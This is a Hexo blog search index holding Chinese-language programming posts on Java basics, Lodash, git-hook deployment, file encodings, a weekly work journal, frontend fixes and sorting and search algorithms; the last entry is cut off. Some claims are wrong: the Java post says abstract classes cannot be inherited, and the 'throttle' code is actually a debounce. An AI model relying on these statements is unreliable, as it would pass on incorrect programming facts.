<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Java基础语法]]></title>
    <url>%2Fblog%2F2019%2F03%2F12%2FJava%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[本文将以简洁精确的语言描述 Java 语言的基础特性，因为我有过几年的其他语言编程经验，所以本文将不会描述流程控制，变量，运算符等过于基础的内容，着重于描述 Java 区别于其他语言的要点。 Java语言特性Java 是纯粹面向对象的语言，其代码书写以类为单位。Java 是一门强类型的静态语言。Java 代码需要编译，编译成为字节码后运行于 JVM 虚拟机之上。因为 Java 虚拟机的存在，Java 具有良好的跨平台特性。 Java语言细节Java 大小写敏感。Java 的源代码文件名要求必须和本文件的类名相同。所有的 Java 程序由public static void main(String []args)方法开始执行。Java 中的变量分为局部变量、静态变量、成员变量，Java 中没有全局变量之说。Java 编译器会忽略空行。 Java 标识符Java 标识符以大小写字母、_、$为开头，以大小写字母、_、$或数字为结尾。 Java 修饰符访问控制修饰符private: 仅在同一类内可操作。default: 仅在同一包内可操作。protected: 在同一包内、继承的子类内可操作。public: 对所有类可操作。 其他修饰符final: 常量声明，变量或类本身 不可以被改变。abstract: 抽象类声明，不能够被继承。static: 静态成员声明，类本身而不是类实例的成员或方法。 Java 枚举Java 可以利用形如下文的代码实现枚举：1234class FreshJuice &#123; enum FreshJuiceSize&#123; SMALL, MEDIUM , LARGE &#125; FreshJuiceSize size;&#125; Java 接口Java 可以利用形如下文的代码实现接口：1234interface Animal &#123; public void eat(); public void travel();&#125; 内置类型Java 中有八大内置数据类型，分别为byte、short、int、long、float、double、boolean、char。非内置数据类型的数据都是引用数据类型。 Java 作用域这里仅仅特意提一下，Java 的局部变量所属作用域为块级作用域。]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Lodash常用函数]]></title>
    <url>%2Fblog%2F2018%2F04%2F18%2FLodash%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[过了一遍Lodash的文档，现将项目中用到的函数和自己觉得很有用的函数分两部分整理如下： 项目中用到的函数omit(object, [props])Object方法，返回忽略属性之外的自身和继承的可枚举属性。1234const object = &#123; 'a': 1, 'b': '2', 'c': 3 &#125;_.omit(object, ['a', 'c'])// =&gt; &#123; 'b': '2' &#125; get(object, path, [defaultValue])Object方法，根据对象路径获取值，如果解析value是undefined会以defaultValue取代。12345678910const object = &#123; 'a': [&#123; 'b': &#123; 'c': 3 &#125; &#125;] &#125;_.get(object, 'a[0].b.c');// =&gt; 3_.get(object, ['a', '0', 'b', 'c'])// =&gt; 3_.get(object, 'a.b.c', 'default')// =&gt; 'default' pick(object, [props])Object方法，创建一个从 object 中选中的属性的对象。1234const object = &#123; 'a': 1, 'b': '2', 'c': 3 &#125;_.pick(object, ['a', 'c'])// =&gt; &#123; 'a': 1, 'c': 3 &#125; noopUtil方法，无论传递什么参数，都返回 undefined。1234const object = &#123; 'user': 'fred' &#125;_.noop(object) === undefined// =&gt; true sortBy(collection, [iteratees=[_.identity]])Collection方法，创建一个元素数组。 以 iteratee 处理的结果升序排序。 这个方法执行稳定排序。 iteratees 会传入1个参数：(value)。123456789101112131415161718const users = [ &#123; 'user': 'fred', 'age': 48 &#125;, &#123; 'user': 'barney', 'age': 36 &#125;, &#123; 'user': 'fred', 'age': 42 &#125;, &#123; 'user': 'barney', 'age': 34 &#125;]_.sortBy(users, o =&gt; o.user)// =&gt; 排序结果 [['barney', 36], ['barney', 34], ['fred', 48], ['fred', 42]]_.sortBy(users, ['user', 'age'])// =&gt; 排序结果 [['barney', 34], ['barney', 36], ['fred', 42], ['fred', 48]]// 先按照user升序，再按照age升序_.sortBy(users, 'user', o =&gt; Math.floor(o.age / 10))// =&gt; 排序结果 [['barney', 36], ['barney', 34], ['fred', 48], ['fred', 42]]// 先按照user排序，再按照Math.floor(o.age / 10)排序，因为稳定排序，所以age顺序不变。 isArray(value)Lang方法，检查 value 是否是 Array 类对象。1234567891011_.isArray([1, 2, 3])// =&gt; true_.isArray(document.body.children)// =&gt; false_.isArray('abc')// =&gt; false_.isArray(_.noop)// =&gt; false without(array, [values])Array方法，创建一个移除了所有提供的 values 。12_.without([1, 2, 1, 3], 1, 2)// =&gt; [3] identity(value)Util方法，这个方法返回首个提供的参数。1234const object = &#123; 'user': 'fred' &#125;_.identity(object) === object// =&gt; true filter(collection, [predicate=_.identity])Collection方法，遍历集合中的元素，筛选出一个经过 predicate 检查结果为真值的数组，predicate 会传入3个参数：(value, index|key, collection)。12345678910111213141516171819202122const resolve = _.partial(_.map, _, 'user')// _.partial: 创建一个函数。 该函数调用 func，并传入预设的参数。 这个方法类似 _.bind，除了它不会绑定 this。 这个 _.partial.placeholder 的值，默认是以 _ 作为附加部分参数的占位符。const users = [ &#123; 'user': 'barney', 'age': 36, 'active': true &#125;, &#123; 'user': 'fred', 'age': 40, 'active': false &#125;]resolve( _.filter(users, o =&gt; !o.active) )// =&gt; ['fred']// 使用了 `_.matches` 的回调结果resolve( _.filter(users, &#123; 'age': 36, 'active': true &#125;) )// =&gt; ['barney']// 使用了 `_.matchesProperty` 的回调结果resolve( _.filter(users, ['active', false]) )// =&gt; ['fred']// 使用了 `_.property` 的回调结果resolve( _.filter(users, 'active') )// =&gt; ['barney'] find(collection, [predicate=_.identity])Collection方法，遍历集合中的元素，返回最先经 predicate 检查为真值的元素，如无匹配，返回undefined。1234567891011121314151617181920const users = [ &#123; 'user': 'barney', 'age': 36, 'active': true &#125;, &#123; 'user': 'fred', 'age': 40, 'active': false &#125;, &#123; 'user': 'pebbles', 'age': 1, 'active': true &#125;]_.find(users, o =&gt; (o.age &lt; 40))// =&gt; 结果: 'barney'// 使用了 `_.matches` 的回调结果_.find(users, &#123; 'age': 1, 'active': true &#125;)// =&gt; 结果: 'pebbles'// 使用了 `_.matchesProperty` 的回调结果_.find(users, ['active', false])// =&gt; 结果: 'fred'// 使用了 `_.property` 的回调结果_.find(users, 'active')// =&gt; 结果: 'barney' omitBy(object, [predicate=_.identity])Object方法，返回经 predicate 判断不是真值的属性的自身和继承的可枚举属性。1234const object = &#123; 'a': 1, 'b': '2', 'c': 3 &#125;_.omitBy(object, _.isNumber)// =&gt; &#123; 'b': '2' &#125; padStart([string=’’], [length=0], [chars=’ ‘])String方法，如果字符串长度小于 length 则在左侧填充字符。 如果超出长度则截断超出的部分。12345678_.padStart('abc', 6)// =&gt; ' abc'_.padStart('abc', 6, '_-')// =&gt; '_-_abc'_.padStart('abc', 3)// =&gt; 'abc' reduce(collection, [iteratee=_.identity], [accumulator])Collection方法，通过 iteratee 遍历集合中的每个元素。 每次返回的值会作为下一次 iteratee 使用。 如果没有提供 accumulator，则集合中的第一个元素作为 accumulator。 iteratee 会传入4个参数：(accumulator, value, index|key, collection)。 12345678_.reduce([1, 2], (sum, n) =&gt; (sum + n), 0);// =&gt; 3_.reduce(&#123; 'a': 1, 'b': 2, 'c': 1 &#125;, (result, value, key) =&gt; &#123; (result[value] || (result[value] = [])).push(key); return result;&#125;, &#123;&#125;);// =&gt; &#123; '1': ['a', 'c'], '2': ['b'] &#125; (无法保证遍历的顺序) isEqual(value, other)Lang方法，执行深比较来决定两者的值是否相等。12345678const object = &#123; 'user': 'fred' &#125;const other = &#123; 'user': 'fred' &#125;_.isEqual(object, other)// =&gt; trueobject === other// =&gt; false 自己觉得很有用的函数times(n, [iteratee=_.identity])Util方法，调用 iteratee N 次，每次调用返回的结果存入到数组中。 iteratee 会传入1个参数：(index)。123456_.times(3, String)// =&gt; ['0', '1', '2'] _.times(4, _.constant(true))// =&gt; [true, true, true, true]// _.constant：创建一个返回 value 的函数 cloneDeep(value)Lang方法，深拷贝。12345const objects = [&#123; 'a': 1 &#125;, &#123; 'b': 2 &#125;]const deep = _.cloneDeep(objects)console.log(deep[0] === objects[0])// =&gt; false random([min=0], [max=1], [floating])Number方法，产生一个包括 min 与 max 之间的数。 如果只提供一个参数返回一个0到提供数之间的数。 如果 floating 设为 true，或者 min 或 max 是浮点数，结果返回浮点数。1234567891011_.random(0, 5)// =&gt; 0 和 5 之间的数_.random(5)// =&gt; 同样是 0 和 5 之间的数_.random(5, true)// =&gt; 0 和 5 之间的浮点数_.random(1.2, 5.2)// =&gt; 1.2 和 5.2 之间的浮点数 sample(collection)Collection方法，从集合中随机获得元素12_.sample([1, 2, 3, 4]);// =&gt; 2 reject(collection, [predicate=_.identity])反向版 _.filter，这个方法返回 predicate 检查为非真值的元素。12345678910111213141516171819const users = [ &#123; 'user': 'barney', 'age': 36, 'active': false &#125;, &#123; 'user': 'fred', 'age': 40, 'active': true &#125;]_.reject(users, o =&gt; !o.active)// =&gt; 结果: ['fred']// 使用了 `_.matches` 的回调结果_.reject(users, &#123; 'age': 40, 'active': true &#125;)// =&gt; 结果: ['barney']// 使用了 `_.matchesProperty` 的回调结果_.reject(users, ['active', false])// =&gt; 结果: ['fred']// 使用了 `_.property` 的回调结果_.reject(users, 'active')// =&gt; 结果: ['barney']]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于githooks和node的自动部署环境搭建]]></title>
    <url>%2Fblog%2F2018%2F04%2F01%2F%E5%9F%BA%E4%BA%8Egithooks%E5%92%8Cnode%E7%9A%84%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[最初的 Vue 脚手架 Vue-cli 和 React 脚手架 ceate-react-app 在编译工程时仅仅将工程编译到本地的一个dist文件夹中，对于我想在我的githubpage上面配置我的网站和音乐播放器造成了困难：我必须build之后再切换分支，将我的dist文件夹内容放进这个分支中，然后重新push才可以实现其部署。 在公司中发现公司工程是使用 makefile 一键部署的，激发了我也将自己的小项目一键部署的欲望。因为我的项目需要经常处在 windows 环境开发所以不打算用 makefile 文件处理，直接上 nodejs 来处理这个问题即可。 决定了大体技术选型，我们需要明白我们要处理一个什么样的问题： 根据我的需求，我需要将我编译的工程一键部署到 githubpages 上。 githubpages 其实往往就是这个工程的 master 分支，也就是说，我需要将我编译后的文件推送到指定的远程分支上。 如果再深入一点，我希望我的后端也可以实现推送到远程分支的时候自动拉取到服务器上，就是最好不过了。 事实上这个部署的思路是在我之前的搬瓦工服务器上面构思并实践的，它分为两个部分，分别对应着我上面的两个需求： git-deployer express 服务器端部署工具 明确了我们的需求，开始技术细节的思考。还是按照两边分开来思考：因为两个需求比较独立。 需求一，需要将编译后文件一键push到远程分支。脑海中隐约觉得自己似乎有遇到过这样的情景： 没错，就是这个hexo博客的部署。我所期望的效果是和执行 hexo d 这个命令一样的效果，所以我决定根据我的经验先去研究一下hexo博客是怎样部署的。通过阅读 hexo-deployer-git 的源代码，理解了它部署的过程： 在工程目录下创建一个临时文件夹。 将指定的编译后的文件放到这个文件夹之中。 将这个文件夹初始化为git的工程，并将 remote 和 分支分别设定为指定的量。 进行 force push 。 明白了它的思路，搜索npm没有相关的可以支持配置普适工程部署的包，于是决定自己写一个。 那么思考一下我所需要完成工程的细节：我想要做一个命令行工具，这个工具用于操作创建指定的临时文件夹并设定git参数，然后进行force push。基于这些细节上网搜索，我选定了shelljs与commender作为我的实践工具。 之后就有了这个简单的包：git-deployer 当然，这个包并不完美，如有人在issues里面所提的： 目前的使用方式是git-deploy -r git@github.com:username/project.git -d ./dist每次都要输入项目地址。可以参考hexo的deploy增加配置文件，（本地项目配置）？本地配置 : 输入配置 可能会参考下一个版本迭代时加入这个功能。 进入下一个问题，我希望每次在我的master分支被push时，我的服务器中都能够进行一个pull操作来执行自动部署。经过查找资料，我发现了解决这个问题的关键: githooksgithooks是指在git中进行关键操作时触发的指定脚本，在github中就提供在push的时候，对指定网址post一个指定请求的githooks。 那么关键的问题也解决了，只需要在自己的服务器上建立一个服务，专门接受这个post请求，如果这个请求是需要pull的某个工程的push请求，即在对应工程执行pull即可。 google搜索一番，发现已经有相关实现：Node.js:使用hook+shell+git进行自动化构建 思考一番发现这个老哥似乎和自己思路一模一样，本着不重复造轮子的原则，直接将老哥大部分代码拷贝，进行细节调整后放到自己服务器上，用nginx代理一个特殊的端口到这个服务上，稍作微调即正常运行。 现在我所有的线上个人项目都使用 git-deployer + npm script进行一键部署，爽歪歪。 参考资料 hexo-deployer-git Node.js命令行程序开发完整教程 Git-Hooks Node.js:使用hook+shell+git进行自动化构建]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件编码探幽]]></title>
    <url>%2Fblog%2F2018%2F03%2F27%2F%E6%96%87%E4%BB%B6%E7%BC%96%E7%A0%81%E6%8E%A2%E5%B9%BD%2F</url>
    <content type="text"><![CDATA[写这篇文章，是因为在阅读《深入理解计算机系统》时候，在它的第一章第一节看到这么一段话 Files such as hello.c that consist exclusively of ASCII characters are known as text files. All other files are known as binary files. 这句话核心逻辑就是：ANSI编码的文件叫做文本文件，其他所有文件都叫做二进制文件。初读这句话感觉十分不可思议，因为对界定逻辑比较敏感所以觉得文本文件、二进制文件与ANSI文件、非ANSI文件无论是定义还是应用语境皆有不同，于是我开始了下面的详细探寻。 首先思考，ANSI文件、非ANSI文件的界定是很清晰的——以ANSI为编码格式存储的文件称之为ANSI文件，反之称之为非ANSI文件。应用场景也很清晰：需要辨明文件编码格式的时候。 那么问题就出在了文本文件、二进制文件的定义和应用范围问题上。 首先上维基百科二者定义： 文本文件一般指只有字符原生编码构成的二进制计算机文件，与富文本相比，其不包含字样样式的控制元素，能够被最简单的文本编辑器直接读取。二进制文件（英语：Binary file）一般指包含ASCLL及扩展ASCII字符中编写的数据或程序指令（Program instructions）的文件。广义的二进制文件即为文件，由文件在外部存储设备的存放方式为二进制而得名。狭义的二进制文件即指除文本文件以外的文件。 看得出来《深》书之描述更接近于狭义的定义: 文本文件以外的文件是二进制文件。但是此定义又与《深》书不同：ANSI编码文件在维基百科的定义上不等于文本文件。 读书解意，既然定义有所不同，那么需要辨明他们为什么不同，才能减轻记忆负担和深入理解问题。 那么辨意的第一步就是明白文本文件和二进制文件的应用场景有哪些。 谷歌搜索文本文件 二进制文件，以前三个结果进行综合分析。2018 年 3 月 27 日按照上述关键词以香港谷歌进行检索，返回的前三个结果分别来源于知乎，博客园，简书。鉴于结果来源社区全都是技术氛围比较浓厚的社区，于是决定都点进去看看。 知乎答案第一名67赞，中心思想为二进制文件和文本文件都是以二进制方式存储，他们的读取方式由文件头决定。不愧是逼乎，人家问区别，你回答没什么区别。虽然增长了知识但是对于我们的问题没有任何直接帮助。 知乎答案第二名31赞，中心思想为二进制文件的实质是它含有文件的内容信息和解释方式，而二进制文件仅仅拥有控制信息和内容，不提供让你直接解读的途径。 接下来分别看看博客园和简书上的两篇高排名博文。 博客园中的博客分别以二者定义，文件存取，优缺点，C语言的二进制和文本方式读写，实例五个方面介绍了文本文件和二进制文件。而其中的实例则证明C语言在进行写文件操作时，仅仅对文本文件多进行一些转换，实质上文件内容仅仅是增加了一些编码内容而已，从侧面重新论述了知乎排名第一的人的言论。 而简书上的那篇博文则直接举出了文本文件和二进制文件的四点区别，也最能解决疑惑： 文本文件基本上是定长编码的(也有非定长的编码如UTF-8)，基于字符，每个字符在具体编码中是固定的，ASCII码是8个比特的编码，UNICODE一般占16个比特。而二进制文件可看成是变长编码的，因为是值编码，多少个比特代表一个值，完全由自己决定。 文本文件依照字符为单位，大多数为定长编码。而二进制文件并不要求依照字符（这体现在前几篇文章中无格式、不存在解释方式等表象上）进行存储。 那么我们可以归纳出文本文件和二进制文件的使用语境：他们大多数用来辨析某个文件能否被人直接以某种编码进行有格式的读取：文本文件可以，二进制文件往往不行。 问题大致至此可以解决：《深》书的描述不够准确，因为当前文本的编码格式不仅仅有ANSI，流行的方案还有UTF-8,UTF-16等等，所有以文本编码存储的文件都可以称之为文本文件。 另外，还有一些很有用的关于编码的知识： 现代文本文件存储往往使用UTF-8编码进行，UTF系列编码是Unicode字符集下的一系列编码规则。 字符集为每一个字符指定了一个唯一的码位，有Unicode，ASCLL等，大多数ANSI编码基于ASCLL字符集。 编码规则将每一个码位转换为字符序列。 UTF-8编码是可变长编码，也就是说存储一个字符用到的存储空间可能不一样长，这样做是为了节省空间。 JavaScript使用的编码是UCS-2编码，所有字符在JavaScript中都是2个字节，如果是4个字节的字符，会被当做两个双字节的字符处理（知乎就有些字符因此无法显示），ES6增加了对双字节Unicode码的支持，但是写程序时还要做一些特殊的处理才能够正确显示，详细请阅读参考资料。 参考资料 知乎：文本文件和二进制文件的区别？请举例说明。 博客园：文本文件与二进制文件区别 简书：文本文件和二进制文件的差异和区别 阮一峰博客：Unicode与JavaScript详解 另参考维基百科相关条目，《深入理解计算机系统》第二版]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[18.3.16周记]]></title>
    <url>%2Fblog%2F2018%2F03%2F16%2F18-3-16%E5%91%A8%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[周记系列打算专门开一个tag叫做周记：做一个每周的积累回顾。周记目前的定位主要在三个方面： 工作中的经验总结 自己实践中的经验总结 阅读和学习的总结 自己的一些反思 顺便提一句，写这个博客时候听的歌是《老司机带带我》，连着听了五个版本整个人都不好了，链接是老司机带带我。 工作实习渐渐经过了熟悉期，开始把一些经验慢慢积累到博客里。 创建了一种能够使安卓手机正常显示12px以下或奇数2倍px字体的hack123456789101112131415161718192021222324252627282930313233import React from 'react'import &#123; isAndroid &#125; from '~/lib/userAgent'/** 修正安卓系统小于12px字体,奇数2倍像素大小字体垂直居中问题* 暂不支持换行*/const FontSizeShim = (&#123; children &#125;) =&gt; isAndroid ? ( &lt;div&gt; &lt;span className="FontSizeShimContent"&gt;&#123;children&#125;&lt;/span&gt; &lt;style jsx&gt;&#123;` .FontSizeShimContent::before &#123; position: absolute; font-size: 4em; transform: scale(0.25); transform-origin: top left; content: '$&#123;children&#125;'; white-space:nowrap; visibility: visible; &#125; .FontSizeShimContent &#123; position: relative; visibility: hidden; &#125; `&#125;&lt;/style&gt; &lt;/div&gt; ) : ( &lt;span&gt;&#123;children&#125;&lt;/span&gt; )export default FontSizeShim 一些经验积累性能优化方面： 频繁触发事件应当使用函数节流，相关的库有throttle等。 React中与render()无关的方法应抽出到类中，避免重复渲染。 代码风格方面： 变量命名应当符合英语语法，例如isSomethingVisible或showSomething。 类方法之间应当空行。 可以用空行来辅助区分代码块。 避免重复的语义在统一块代码中出现，比如isSomethingVisible和showSomething。 排错经验方面： 设置webpack的sourcemap。 对于something1.something2.something3这种类型的对象属性调用应该谨慎，否则当something2不存在时直接调用会报错。处理这种情况的方式有逐级排查或者使用lodash/get之类的库辅助检测。 实践这周主要用node写了个命令行工具，用于在 Github Pages 上快速部署自己的项目。链接在这里： git-deployer。主要原理就是将指定文件夹的内容拷贝进入一个新文件夹，再将新文件夹的git remote设置为指定的地址，进行force push。写了个纪念比利王的网站，优化了music和主站的code，Review了工作室新前端失物招领系统的代码，写了课程表小程序的登陆页面，就不细说了吧。 另外在自己的bandwagonHost上面尝试了用express脚本结合githooks自动部署代码，原理就是github自动post一个请求到我的服务器，然后我的服务器收到对应请求之后执行相应的shell脚本。 阅读与学习最近在阅读《代码大全》，并过了一下node的教程。《代码大全》中关于编码过程的思考我放在下一节讲。接下来想读的书是吴浩麟的《深入浅出Webpack》和张鑫旭的《CSS世界》。 反思与杂谈其实某种意义上来讲这个章节才是每周最重要的部分吧，会放一些思考在里面。 和设计师沟通的细节程度在弦歌的时候，因为缺乏交互设计，往往是61或者李林林给我平面设计图，所有的设计和交互细节由我自己敲定，大一点的方面去询问设计师。在奇迹空间的时候，往往是Tinker直接派发任务，由我来直接借助既有的样式库完成前后端所有的部分。这并不是没有原因：因为在开发的项目是一个后台管理系统，不需要十分注重交互体验。多抓鱼是我目前以来所认识到的对于设计体验要求最为详细的公司，和印子交谈的过程中往往细节会深化到某一个特别微小辅助元素的跳转。（没错我指的就是新书单列表页由XXX推荐那一行小字）。这样细微的沟通有好处，可以完全还原设计师的意图和理念，但是也有坏处：修改一个列表页的细节情况竟然需要沟通3~4次。当然其中有我们之间还不够了解以及我现在有一些做到哪想到哪的问题（这个问题在“对处理事情的顺序思考”一节有详细的描述），但是刨除这些因素，考虑到下一次沟通也有可能依赖上一次沟通，以此类推，即使是小细节的修改，也要沟通两次左右，这对于开发效率会有降低，被提出沟通方正在进行的工作会被打断。这个问题的细节需要下周和印子谈谈，问问她以前和超强以及 Whyme 沟通设计细节时的粒度。 对编码目标认识的改变忽然翻到我以前的一个知乎回答已经学完 HTML/CSS 但是完全看不懂JavaScript 教程怎么办？发现自己对于前端学习的认识已经上升到另外的阶段，不再以库的掌握为标准而评判了。对于工作中进行code review时出现最多的问题往往有三个 对于英文单词拼写的问题 对于判断结构先后和嵌套设计问题 关于文件结构分配的问题 事实上这些问题正渐渐从“怎么写出来一个功能”到“怎么写好一个功能”迁移。从这些方面也能感受到自己有一定的提升了。 对处理编码和设计细节的顺序思考思考设计需求和进行编码时候我习惯做到哪想到哪，而《代码大全》指出，优良的进行编码的方式应该是思考占75%时间，编码占25%时间。考虑到我编码时而对一些技术细节不清晰需要查询，那么也应该至少把这个时间调整为思考50%，编码50%。在编码之前就把需求和架构思考清晰，编码时只注重技术细节才是最优良的思考方式。否则容易陷入编码到一半突然发现这个架构不行或者没弄明白需求的情况。同样的，在二次设计讨论之前，应该谨慎思考清楚自己的问题思路，避免进行三次四次的讨论降低效率打断思路。]]></content>
      <tags>
        <tag>周记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[滚动穿透问题完美解决方案]]></title>
    <url>%2Fblog%2F2018%2F01%2F07%2F%E6%BB%9A%E5%8A%A8%E7%A9%BF%E9%80%8F%E9%97%AE%E9%A2%98%E5%AE%8C%E7%BE%8E%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[滚动穿透问题往往发生在移动端呼出模态框的时候，滑动模态框内内容，背后的body也跟着滑动。下面提供了一种完美的解决方案。1234body.modal-open &#123; position: fixed; width: 100%;&#125;123456789101112131415161718192021/*** ModalHelper helpers resolve the modal scrolling issue on mobile devices* https://github.com/twbs/bootstrap/issues/15852* requires document.scrollingElement polyfill* https://github.com/yangg/scrolling-element\*/var ModalHelper = (function(bodyCls) &#123; var scrollTop; return &#123; afterOpen: function() &#123; scrollTop = document.scrollingElement.scrollTop; document.body.classList.add(bodyCls); document.body.style.top = -scrollTop + 'px'; &#125;, beforeClose: function() &#123; document.body.classList.remove(bodyCls); // scrollTop lost after set position:fixed, restore it back. document.scrollingElement.scrollTop = scrollTop; &#125; &#125;;&#125;)('modal-open');]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用setTimeout实现函数节流]]></title>
    <url>%2Fblog%2F2018%2F01%2F07%2F%E5%87%BD%E6%95%B0%E8%8A%82%E6%B5%81%2F</url>
    <content type="text"><![CDATA[当一个事件频繁触发，我们往往希望它不要每次触发都执行它的回调。实现这种效果的技术称作函数节流。下面提供一种通过setTimeout进行函数节流的实现。1234567891011121314151617181920function delayFun (func, wait, immediate) &#123; var timeout; return function() &#123; var context = this, args = arguments; var later = function() &#123; timeout = null; if (!immediate) func.apply(context, args); &#125;; var callNow = immediate || !timeout; clearTimeout(timeout); timeout = setTimeout(later, wait); if (callNow) func.apply(context, args); &#125;;&#125;;// 用法var myEfficientFn = delayFun (function() &#123; // 所有繁重的操作&#125;, 250);window.addEventListener('resize', myEfficientFn);]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[八大排序三大查找JavaScript实现之三：希尔排序]]></title>
    <url>%2Fblog%2F2017%2F12%2F13%2F%E5%85%AB%E5%A4%A7%E6%8E%92%E5%BA%8F%E4%B8%89%E5%A4%A7%E6%9F%A5%E6%89%BEJavaScript%E5%AE%9E%E7%8E%B0%E4%B9%8B%E4%B8%89%EF%BC%9A%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[这是我“八大排序三大查找JavaScript实现”系列文章的第三篇，转载请注明来源。所有排序算法针对顺序存储结构，以升序方式排列；三大查找算法不涉及动态查找（查找树与平衡查找树等）的知识。文章算法仅供参考复习数据结构与算法之用，实际工程推荐使用使用Array.prototype.sort()函数和Array.prototype.indexOf()函数 空间复杂度 时间复杂度 稳定性 时间复杂度：希尔排序的时间复杂度和其增量序列有关系，这涉及到数学上尚未解决的难题；不过在某些序列中复杂度可以为O(n1.3); 空间复杂度：O(1) 稳定性：不稳定 算法描述将无序数组分割为若干个子序列，子序列不是逐段分割的，而是相隔特定的增量的子序列，对各个子序列进行插入排序；然后再选择一个更小的增量，再将数组分割为多个子序列进行排序……最后选择增量为1，即使用直接插入排序，使最终数组成为有序。 算法解析希尔排序是插入排序的一种，该方法实质上是一种分组插入方法。我写的例子中采用的增量是希尔增量，事实上希尔增量并不是效率最好的增量。 希尔排序的时间性能优于直接插入排序的原因： 当文件初态基本有序时直接插入排序所需的比较和移动次数均较少。 当n值较小时，n和n2的差别也较小，即直接插入排序的最好时间复杂度O(n)和最坏时间复杂度0(n2)差别不大。 在希尔排序开始时增量较大，分组较多，每组的记录数目少，故各组内直接插入较快，后来增量di逐渐缩小，分组数逐渐减少，而各组的记录数目逐渐增多，但由于已经按di-1作为距离排过序，使文件较接近于有序状态，所以新的一趟排序过程也较快。 因此，希尔排序在效率上较直接插人排序有较大的改进。 算法实现1234567891011121314151617181920function shell_sort (array) &#123; var temp, gap; for (gap = Math.floor(array.length / 2);gap &gt; 0;gap = Math.floor(gap / 2)) &#123; for (var i = gap;i &lt; array.length;i += gap) &#123; temp = array[i]; for (var j = i;j &gt;= gap;j -= gap)&#123; if (temp &lt; array[j - gap]) &#123; array[j] = array[j - gap]; &#125; else &#123; break; &#125; &#125; array[j] = temp; &#125; &#125;&#125;arr = [6, 5, 7, 2, 4, 3, 0, 9, 1, 8];shell_sort(arr);console.log(arr); //[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[八大排序三大查找JavaScript实现之二：线性查找，二分查找]]></title>
    <url>%2Fblog%2F2017%2F12%2F11%2F%E5%85%AB%E5%A4%A7%E6%8E%92%E5%BA%8F%E4%B8%89%E5%A4%A7%E6%9F%A5%E6%89%BEJavaScript%E5%AE%9E%E7%8E%B0%E4%B9%8B%E4%BA%8C%EF%BC%9A%E9%A1%BA%E5%BA%8F%E6%9F%A5%E6%89%BE%EF%BC%8C%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE%2F</url>
    <content type="text"><![CDATA[这是我“八大排序三大查找JavaScript实现”系列文章的第二篇，转载请注明来源。所有排序算法针对顺序存储结构，以升序方式排列；三大查找算法不涉及动态查找（查找树与平衡查找树等）的知识。文章算法仅供参考复习数据结构与算法之用，实际工程推荐使用使用Array.prototype.sort()函数和Array.prototype.indexOf()函数 线性查找时间复杂度 时间复杂度：O(n) 算法描述从第一个记录开始，逐个比较记录的关键字，直到和给定的K值相等，则查找成功；若比较结果与文件中n个记录的关键字都不等，则查找失败。 算法实现123456789101112function linear_search (keyword, array) &#123; for (var i = 0;i &lt; array.length;i++) &#123; if (array[i] === keyword) &#123; return i; &#125; &#125; return -1;&#125;arr = [6, 5, 7, 2, 4, 3, 0, 9, 1, 8];var result = linear_search(3, arr);console.log(result); //5 二分查找时间复杂度 时间复杂度：O(logn) 算法描述对于升序序列查找所要查找的元素时,首先与序列中间的元素进行比较,如果大于这个元素,就在当前序列的后半部分继续查找,如果小于这个元素,就在当前序列的前半部分继续查找,直到找到相同的元素,或者所查找的序列范围为空为止。（降序亦然） 递归实现12345678910111213141516171819function bisect_search (keyword, array, left, right) &#123; var start = left || 0, end = right || array.length - 1; var mid = Math.floor((end - start) / 2) + start; if (array[mid] === keyword) &#123; return mid; &#125; if (start &gt;= end) &#123; return -1; &#125; else if (keyword &gt; array[mid]) &#123; return bisect_search(keyword, array, mid + 1, end); &#125; else if (keyword &lt; array[mid]) &#123; return bisect_search(keyword, array, start, mid - 1); &#125; return -1; &#125;arr = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];var result = bisect_search(3, arr);console.log(result); //3 非递归实现1234567891011121314151617181920212223function bisect_search (keyword, array) &#123; var mid = array.length / 2; if (keyword === array[mid]) &#123; return mid; &#125; var start = 0; var end = array.length - 1; while (start &lt;= end) &#123; mid = Math.floor((end - start) / 2) + start; if (keyword &lt; array[mid]) &#123; end = mid - 1; &#125; else if (keyword &gt; array[mid]) &#123; start = mid + 1; &#125; else &#123; return mid; &#125; &#125; return -1;&#125;arr = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9];var result = bisect_search(3, arr);console.log(result); //3]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[八大排序三大查找JavaScript实现之一：冒泡排序，简单选择排序，插入排序]]></title>
    <url>%2Fblog%2F2017%2F12%2F11%2F%E5%85%AB%E5%A4%A7%E6%8E%92%E5%BA%8F%E4%B8%89%E5%A4%A7%E6%9F%A5%E6%89%BEJavaScript%E5%AE%9E%E7%8E%B0%E4%B9%8B%E4%B8%80%EF%BC%9A%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%EF%BC%8C%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F%2F</url>
